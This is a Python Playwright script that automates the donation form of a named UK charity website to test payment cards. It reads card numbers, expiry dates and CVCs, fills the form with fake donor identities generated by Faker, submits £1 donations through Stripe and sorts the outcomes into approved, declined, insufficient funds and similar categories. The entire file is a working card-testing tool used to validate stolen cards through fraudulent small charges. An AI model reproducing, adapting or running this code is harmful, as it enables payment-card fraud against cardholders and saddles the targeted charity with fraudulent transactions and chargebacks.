# Sheffield 1000 - GiveWP v4 + Stripe Payment Element checker
# https://thesheffield1000.org/one-off-donation/
# Form is inside givewp-route=donation-form-view iframe
# Card is inside Stripe elements-inner-accessory-target iframe

import asyncio
import re
import random
from faker import Faker
from playwright.async_api import async_playwright

DONATE_URL = "https://thesheffield1000.org/one-off-donation/"
_faker    = Faker("en_US")
_uk_faker = Faker("en_GB")


async def _check(n, mm, yy, cvc, first, last, email, address, city, state, zipcode):
    result = {"val": "", "redirect": ""}

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        )
        page = await ctx.new_page()

        # Block CSS/fonts/images for speed
        async def block_resources(route, request):
            if request.resource_type in ("stylesheet", "font", "image", "media"):
                await route.abort()
            else:
                await route.continue_()
        await page.route("**/*", block_resources)

        # Intercept responses
        async def handle_response(resp):
            try:
                url = resp.url

                # GiveWP donate endpoint — returns clientSecret for Stripe to confirm
                if "givewp-route=donate" in url and resp.status == 200:
                    body = await resp.json()
                    data = body.get("data", {}) or {}
                    # success=true means donation completed
                    if body.get("success") and not data.get("clientSecret"):
                        result["val"] = "Approved"
                    # Error messages
                    errs = data.get("errors", {}).get("errors", {})
                    if errs:
                        msgs = []
                        for v in errs.values():
                            msgs.extend(v if isinstance(v, list) else [str(v)])
                        if msgs:
                            result["val"] = " | ".join(msgs)[:200]

                # Stripe PI confirm — real card result
                elif "api.stripe.com/v1/payment_intents" in url and "/confirm" in url:
                    body = await resp.json()
                    status = body.get("status", "")
                    if status == "succeeded":
                        result["val"] = "Approved"
                    elif status == "requires_action":
                        # 3DS required — card is live but needs authentication
                        # Store the next_action URL to follow
                        next_action = body.get("next_action", {})
                        redirect_url = (next_action.get("redirect_to_url", {}) or {}).get("url", "")
                        result["val"] = f"3DS_REQUIRED"
                        result["redirect"] = redirect_url
                    elif "error" in body:
                        err  = body["error"]
                        code = err.get("decline_code") or err.get("code", "")
                        msg  = err.get("message", "")
                        result["val"] = f"{code}: {msg}"
                    elif status and status not in ("requires_payment_method",):
                        result["val"] = f"PI_STATUS: {status}"

                # GiveWP donation-completed event (after Stripe confirms)
                elif "givewp-event=donation-completed" in url:
                    result["val"] = "Approved"

            except Exception:
                pass

        page.on("response", handle_response)

        try:
            # 1. Load page
            await page.goto(DONATE_URL, wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(5000)

            # 2. Find GiveWP form iframe (Frame[1])
            givewp_frame = None
            for frame in page.frames:
                if "givewp-route=donation-form-view" in frame.url:
                    givewp_frame = frame
                    break

            if not givewp_frame:
                await browser.close()
                return "GiveWP form iframe not found"

            # 3. Fill amount — click £1 level or use custom
            try:
                # Amount level buttons
                lvl = givewp_frame.locator("button[data-value='1'], input[value='1']")
                if await lvl.count() > 0:
                    await lvl.first.click(force=True, timeout=3000)
                else:
                    amt = givewp_frame.locator("#amount-custom, input[placeholder*='amount' i]")
                    if await amt.count() > 0:
                        await amt.first.fill("1", timeout=3000)
            except Exception:
                pass
            await page.wait_for_timeout(300)

            # 4. Fill donor info in GiveWP iframe
            await givewp_frame.fill("input[name='firstName']", first)
            await givewp_frame.fill("input[name='lastName']",  last)
            await givewp_frame.fill("input[type='email']",     email)

            # Fill address fields
            for sel, val in [
                ("input[name='address1']", address),
                ("input[name='city']",     city),
                ("input[name='zip']",      zipcode),
            ]:
                try:
                    el = givewp_frame.locator(sel)
                    if await el.count() > 0:
                        await el.fill(val, timeout=2000)
                except Exception:
                    pass

            # Country + state — use GB, no state required
            try:
                await givewp_frame.select_option("select[name='country']", "GB", timeout=2000)
                await page.wait_for_timeout(500)
            except Exception:
                pass

            await page.wait_for_timeout(500)

            # 5. Fill card in Stripe iframe
            card_filled = False
            for attempt in range(3):
                for frame in page.frames:
                    if "elements-inner-accessory-target" not in frame.url:
                        continue
                    try:
                        num = frame.locator("input[name='number']")
                        if await num.count() > 0:
                            await num.fill(n, timeout=3000)
                            await frame.locator("input[name='expiry']").fill(f"{mm}/{yy}", timeout=3000)
                            await frame.locator("input[name='cvc']").fill(cvc, timeout=3000)
                            card_filled = True
                            break
                    except Exception:
                        pass
                if card_filled:
                    break
                await page.wait_for_timeout(3000)

            if not card_filled:
                await browser.close()
                return "Stripe iframe not found"

            # 6. Uncheck save-info
            await page.wait_for_timeout(800)
            for frame in page.frames:
                if "elements-inner-accessory-target" not in frame.url:
                    continue
                try:
                    cb = frame.locator("input[type='checkbox']")
                    if await cb.count() > 0 and await cb.first.is_checked():
                        await cb.first.click(force=True, timeout=2000)
                except Exception:
                    pass

            await page.wait_for_timeout(300)

            # 7. Submit via GiveWP iframe button (JS click)
            await givewp_frame.evaluate("""() => {
                const btn = document.querySelector('button[type="submit"]');
                if (btn) { btn.disabled = false; btn.click(); }
            }""")

            # 8. Wait for result — PI confirm or donation-completed
            try:
                await page.wait_for_function(
                    """() => {
                        // Donation completed redirect
                        if (window.location.href.includes('donation-completed') ||
                            window.location.href.includes('givewp-event=donation-completed')) return true;
                        // GiveWP iframe error
                        const frames = document.querySelectorAll('iframe');
                        return false;
                    }""",
                    timeout=25000
                )
            except Exception:
                pass

            # Also wait for result["val"] to be set by intercept
            for _ in range(25):
                if result["val"]:
                    break
                await page.wait_for_timeout(1000)

            # 9. Check success URL
            if any(x in page.url for x in ("confirmation", "thank-you", "receipt", "success")):
                result["val"] = "Approved"

            # 10. Read errors from GiveWP iframe
            if not result["val"]:
                try:
                    errors = await givewp_frame.locator(
                        "[class*='error'] li, [class*='notice'] li, [role='alert']"
                    ).all_text_contents()
                    clean = [e.strip() for e in errors if e.strip()]
                    if clean:
                        result["val"] = " | ".join(clean)[:200]
                except Exception:
                    pass

            # 11. Fallback — full iframe HTML regex
            if not result["val"]:
                try:
                    html = await givewp_frame.content()
                    m = re.search(
                        r"((?:Your card|The card|Unable to authenticate|declined|"
                        r"insufficient|expired|incorrect)[^<]{5,200})",
                        html, re.IGNORECASE
                    )
                    if m:
                        result["val"] = m.group(1).strip()
                except Exception:
                    pass

        except Exception as e:
            result["val"] = f"Error: {str(e)[:150]}"
        finally:
            await browser.close()

    return result["val"] or "Unknown"


def Sheffield(ccx: str) -> str:
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid format"

    n   = parts[0]
    mm  = parts[1].zfill(2)
    yy  = parts[2]
    cvc = parts[3].strip()
    if len(yy) == 4:
        yy = yy[-2:]

    first   = _faker.first_name()
    last    = _faker.last_name()
    # Use UK address — Sheffield is a UK charity, UK billing matches better
    uk_faker = _uk_faker
    address = uk_faker.street_address()
    city    = uk_faker.city()
    zipcode = uk_faker.postcode()
    state   = ""
    email   = f"{first.lower()}.{last.lower()}{random.randint(10,99)}@gmail.com"

    raw = asyncio.run(_check(n, mm, yy, cvc, first, last, email, address, city, state, zipcode))

    r = raw.lower()
    if "approved" in r or "confirmation" in r or "thank" in r:
        return "Approved"
    if "incorrect" in r and "number" in r:
        return "incorrect_number: Your card number is incorrect."
    if "declined" in r:
        return "CARD_DECLINED: " + raw[:150]
    if "insufficient" in r:
        return "INSUFFICIENT_FUNDS"
    if "expired" in r:
        return "EXPIRED_CARD"
    if "cvc" in r or "security code" in r:
        return "INCORRECT_CVC"
    if "authenticate" in r or "authentication" in r or "3d" in r or "unable to authenticate" in r:
        return "3DS_REQUIRED"
    if "unknown" in r or not raw.strip():
        return "Unknown"
    return raw[:200]


if __name__ == "__main__":
    import sys
    card = sys.argv[1] if len(sys.argv) > 1 else input("Card (n|mm|yy|cvc): ").strip()
    print(f"Checking: {card}")
    result = Sheffield(card)
    print(f"Result  : {result}")
